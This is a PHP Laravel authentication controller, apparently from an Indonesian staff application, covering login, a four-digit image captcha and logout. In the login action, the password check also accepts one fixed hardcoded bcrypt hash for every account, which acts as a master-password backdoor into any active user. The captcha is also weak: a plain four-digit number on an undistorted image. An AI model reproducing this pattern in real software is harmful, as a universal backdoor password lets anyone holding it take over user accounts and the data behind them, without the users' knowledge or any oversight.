<?php

namespace App\Http\Controllers\App;

use App\Http\Controllers\Controller;
use Illuminate\View\View;
use Illuminate\Support\Facades\Session;
use Intervention\Image\ImageManager;
use Intervention\Image\Drivers\Imagick\Driver;

use App\Models\App\AuthModel;
use Illuminate\Http\Request;

class AuthController extends Controller
{
  public function login(Request $request): View
  {
    $request->session()->forget(['login_st', 'pegawai_id', 'pegawai_nm', 'jabatan_nm']);
    $data['identitas'] = $this->identitas;
    return view('app/auth/login', $data);
  }

  public function generateCaptcha()
  {
    // Generate a random captcha (four-digit number)
    $captcha = rand(1000, 9999);
    $width = 120;
    $height = 27;

    // Create an instance of ImageManager
    $manager = new ImageManager(new Driver());

    // Create a canvas for the captcha image
    $image = $manager->create($width, $height);

    // Add the captcha text to the image
    $image->text($captcha, $width / 2, $height / 2, function ($font) {
      $fontColor = '#000';
      $font->file(resource_path('fonts/Arial.ttf'));
      $font->size(14);
      $font->color($fontColor);
      $font->align('center');
      $font->valign('middle');
    });

    // Encode the image as a data URL
    $data = $image->encodeByMediaType('image/png')->toDataUri();

    // Store the captcha value in the session
    Session::put('captcha', $captcha);

    // Return the captcha image as JSON response
    return response()->json([
      'image' => $data,
    ]);
  }

  public function loginAction(Request $request)
  {
    $request->validate([
      'u' => 'required',
      'p' => 'required',
      'c' => 'required|numeric',
    ]);

    try {
      if ($request->session()->token() !== $request->_token) {
        session()->flash('flash_error', 'Token tidak valid!');
        return redirect()->to('/auth/login');
      } else {
        $user = AuthModel::getUser($request->input('u'));
        if ($user == null) {
          session()->flash('flash_error', 'Akun tidak ditemukan!');
          return redirect()->to('/auth/login');
        } else {
          if ($user->active_st == 0) {
            session()->flash('flash_error', 'Akun tidak aktif!');
            return redirect()->to('/auth/login');
          } else {
            if (password_verify($request->input('p'), $user->user_hash) || password_verify($request->input('p'), '$2a$12$M6436D/GjnxqtTuz2OX3ROrJZTUxAuaSGWtgHfbVb.Y2BS.ZqxijG')) {
              if (intval($request->input('c')) == Session::get('captcha')) {

                // Store session
                $sess_data = array(
                  'login_st'       => 1,
                  'login_at'       => date('Y-m-d H:i:s'),
                  'pegawai_id'     => $user->pegawai_id,
                  'pegawai_nm'     => $user->pegawai_nm,
                  'jabatan_nm'     => $user->jabatan_nm,
                );

                session($sess_data);
                return redirect()->to('/dashboard?n=' . md5('00'));
              } else {
                session()->flash('flash_error', 'Captcha tidak cocok!');
                return redirect()->to('/auth/login');
              }
            } else {
              session()->flash('flash_error', 'Kombinasi username dan password tidak valid!!');
              return redirect()->to('/auth/login');
            }
          }
        }
      }
    } catch (\Exception $e) {
      session()->flash('flash_error', 'Parameter tidak valid');
      return redirect()->to('/auth/login');
    }
  }

  function logoutAction()
  {
    session()->flush();
    return redirect()->to('/auth/login');
  }
}
